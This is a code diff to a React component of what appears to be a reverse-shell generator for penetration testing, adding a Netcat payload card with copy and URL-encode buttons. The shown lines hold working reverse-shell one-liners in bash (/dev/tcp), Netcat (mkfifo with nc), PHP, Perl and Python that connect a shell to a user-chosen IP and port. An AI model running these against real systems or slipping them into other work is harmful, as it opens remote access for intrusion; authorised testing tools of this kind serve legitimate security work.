@@ -29,6 +29,7 @@ export default (props) => {
     message.success("Reverse shell URI encoded has been copied");
   };
   const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
+  const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${values.ip} ${values.port} >/tmp/f`;
   const php_rshell = `php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
   const perl_rshell = `perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
   const python_rshell = `python -c 'import sys,socket,os,pty;s=socket.socket()
@@ -101,8 +102,35 @@ export default (props) => {
         </Clipboard>
       </div>
       <Divider dashed />
+      <div style={{ padding: 10, marginTop: 15 }} key='b'>
+        <Title level={3}>
+          Netcat <IconFont type='icon-command-line' />
+        </Title>
+        <Paragraph copyable ellipsis={true}>
+          {netcat_rshell}
+        </Paragraph>
+        <Clipboard component='a' data-clipboard-text={netcat_rshell}>
+          <Button
+            type='primary'
+            onClick={successInfoReverseShell}
+            style={{ marginBottom: 10, marginTop: 15 }}
+          >
+            <CopyOutlined /> Copy the reverse shell
+          </Button>
+        </Clipboard>
+        <Clipboard component='a' data-clipboard-text={encodeURI(netcat_rshell)}>
+          <Button
+            type='dashed'
+            onClick={successInfoEncodeURL}
+            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+          >
+            <LinkOutlined /> URL encoded
+          </Button>
+        </Clipboard>
+      </div>
+      <Divider dashed />
       <div
-        key='b'
+        key='c'
         style={{
           padding: 15,
           marginTop: 15,
@@ -136,7 +164,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='c'
+        key='d'
         style={{
           padding: 15,
           marginTop: 15,
@@ -170,7 +198,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='d'
+        key='e'
         style={{
           padding: 15,
           marginTop: 15,
@@ -205,7 +233,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='e'
+        key='f'
         style={{
           padding: 15,
           marginTop: 15,
@@ -238,7 +266,7 @@ export default (props) => {
         </Clipboard>
       </div>
       <Divider dashed />
-      <div style={{ padding: 15, marginTop: 15 }} key='f'>
+      <div style={{ padding: 15, marginTop: 15 }} key='g'>
         <Title level={3}>
           Telnet <IconFont type='icon-lvzhou_yuanchengTelnet' />
         </Title>
